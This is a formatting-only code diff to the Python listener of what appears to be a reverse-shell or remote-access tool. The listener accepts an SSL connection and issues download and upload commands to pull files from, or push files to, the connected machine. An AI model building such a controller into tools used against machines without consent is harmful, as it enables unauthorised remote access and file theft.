@@ -1,8 +1,6 @@
 from threading import Thread
 import tools
-
 from colorama import Fore
-
 from socket import timeout, AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET 
 import ssl
 import socket
@@ -11,6 +9,7 @@ import os
 
 BUFFER_SIZE = 1024
 BUFFER_SIZE_ReverseShell = 1024 * 10
+
 
 class SecureCommunication:
 
@@ -24,46 +23,44 @@ class SecureCommunication:
     def secure_connect(self):
         sockt = socket.socket(AF_INET, SOCK_STREAM)
         sockt.bind((self.ip_address, self.port))
-
         sockt.listen(1)
         sockt.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
         try:
             s_ssl = ssl.wrap_socket(sockt, keyfile=self.keyFile, certfile=self.certFile, server_side=True)
             print("\n[i] Waiting for client ...")
             self.ssl_sock, (ip, port) = s_ssl.accept()
-            print("[i] Connected with: ",ip,":",str(port))
+            print("[i] Connected with: ", ip, ":", str(port))
             logging.info("Connected to {}:{}".format(ip, str(port)))
             return ip
-
         except socket.error as errorCode:
             print(Fore.RED + "[X] Error: {0}".format(errorCode))
             logging.error("Error:{0}".format(errorCode))
 
-
     def download_file(self, file_path):
-        self.send_msg("[DOWN]"+file_path)
+        self.send_msg("[DOWN]" + file_path)
         data_size = int(self.recv_msg())
         if data_size > 0 :
             print("[i] Download file (size: ", data_size, "b )")
-            logging.info("Download file (size: "+ str(data_size) +  "b )")
+            logging.info("Download file (size: " + str(data_size) + "b )")
             data_raw = self.ssl_sock.recv(int(data_size))
-
             down_file_path = input("Entre file path that you want to download: ")
             tools.save_raw_file(down_file_path, data_raw)
             print("[i] File downloaded !")
         else:
-            print(Fore.RED +"[X] Invalid file !")
+            print(Fore.RED + "[X] Invalid file !")
+
     def upload_file(self, file_path):
         data_raw = tools.read_raw_file(file_path)
         data_size = os.path.getsize(file_path)
-        if(data_size > 0):
-            self.send_msg("[UP]"+ str(data_size))
+        if data_size > 0:
+            self.send_msg("[UP]" + str(data_size))
             self.ssl_sock.write(data_raw)
             up_file_path = input("Entre file path that you want to upload: ")
             self.send_msg(up_file_path)
             print("[i] File upload size: ", data_size, "b")
         else:
-            print(Fore.RED +"[X] Invalid file !")
+            print(Fore.RED + "[X] Invalid file !")
+
     def send_msg(self, message):
         try:
             self.ssl_sock.write(message.encode())
